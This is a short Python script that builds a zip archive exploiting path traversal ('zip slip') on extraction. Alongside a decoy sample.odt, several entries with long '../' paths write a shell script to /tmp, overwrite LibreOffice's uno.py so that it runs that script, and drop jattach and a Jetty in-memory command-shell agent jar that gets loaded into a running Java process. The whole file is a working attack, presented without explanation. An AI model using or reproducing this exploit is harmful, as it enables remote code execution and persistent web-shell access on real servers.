import zipfile

if __name__ == "__main__":
    try:
        f1 = open("sample.odt", 'rb')
        binary_data_1 = f1.read()
        f1.close() 
        f2 = open("jattach", 'rb')
        binary_data_2 = f2.read()
        f2.close() 
        f3 = open("JettyCommandMemShellAgent.jar", 'rb')
        binary_data_3 = f3.read()
        f3.close()
        binary1 = b"chmod +x /tmp/jattach && /tmp/jattach 1 load instrument false /tmp/JettyCommandMemShellAgent.jar"
        binary2 = b"import os\nos.system('sh /tmp/exec.sh && rm /tmp/exec.sh')\n"
        zipFile = zipfile.ZipFile("cmd.zip", "a", zipfile.ZIP_DEFLATED)
        zipFile.writestr("sample.odt", binary_data_1)
        zipFile.writestr("../../../../../../../../../../../../../../../../../../../tmp/exec.sh", binary1)
        zipFile.writestr("../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py", binary2)
        zipFile.writestr("../../../../../../../../../../../../../../../../../../../tmp/jattach", binary_data_2)
        zipFile.writestr("../../../../../../../../../../../../../../../../../../../tmp/JettyCommandMemShellAgent.jar", binary_data_3)

        
        zipFile.close()
    except IOError as e:
        raise e
